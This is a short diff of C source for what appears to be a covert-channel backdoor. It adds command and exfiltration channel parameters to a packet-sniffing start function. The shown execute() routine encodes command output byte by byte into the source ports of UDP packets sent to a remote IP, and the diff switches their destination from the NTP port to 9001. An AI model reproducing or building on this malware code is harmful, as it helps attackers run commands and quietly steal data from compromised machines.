@@ -30,12 +30,18 @@ struct exfil_pack
 	char  *folder;
 };
 
-void pcap_start(const char *fltr_str, uint32 ipaddr, char *folder)
+int com_chan;
+int xfl_chan;
+
+void pcap_start(const char *fltr_str, uint32 ipaddr, char *folder, int cchan, int xchan)
 {
 	pcap_t* nic;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pthread_t exfil_thread;
 	struct exfil_pack expack;
+
+	com_chan = cchan;
+	xfl_chan = xchan;
 
 	// Setup Exfil Watch
 	expack.ipaddr = ipaddr;
@@ -145,7 +151,7 @@ void execute(char *command, u_int32_t ip, u_int16_t port)
 	for (int i = 0; i < tot_len; i += 8)
 	{
 		char frame[FRAM_SZ];
-//			char *enc;
+//		char *enc;
 		char *ptr;
 		int fram_len;
 		uint16 src_port = 0;
@@ -157,14 +163,14 @@ void execute(char *command, u_int32_t ip, u_int16_t port)
 
 		memcpy(frame, ptr, fram_len);
 
-//			enc = encrypt(SEKRET, frame, FRAM_SZ);
+//		enc = encrypt(SEKRET, frame, FRAM_SZ);
 
 		for (int j = 0; j < FRAM_SZ; ++j)
 		{
 			uint8 byte = frame[j];
 			src_port = 0xFF00 & SIGNTR << 8;
 			src_port += byte;
-			dst_port = PORT_NTP;
+			dst_port = 9001;
 
 			_send(ip, src_port, dst_port, CHAN_UDP);
 			usleep(SLEEP_TIME);
